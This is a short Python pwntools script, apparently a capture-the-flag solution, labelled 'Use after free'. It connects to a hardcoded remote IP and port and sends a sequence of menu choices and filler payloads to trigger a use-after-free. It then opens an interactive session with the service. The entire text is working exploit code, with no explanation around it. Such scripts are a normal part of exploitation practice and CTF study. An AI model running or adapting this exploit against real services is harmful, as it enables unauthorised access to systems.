#Use after free
#aka UAF
from pwn import * 
p = connect("159.223.73.72", 1001)
p.sendline("2")
p.sendline(b"A"*450)

p.sendline("2")
p.sendline("X")

p.sendline("2")
p.sendline("X")

p.sendline("3")
p.sendline("1")

p.sendline("3")
p.sendline("2")

p.sendline("2")
p.sendline("dd")

p.sendline("1")
p.sendline("2")
p.interactive()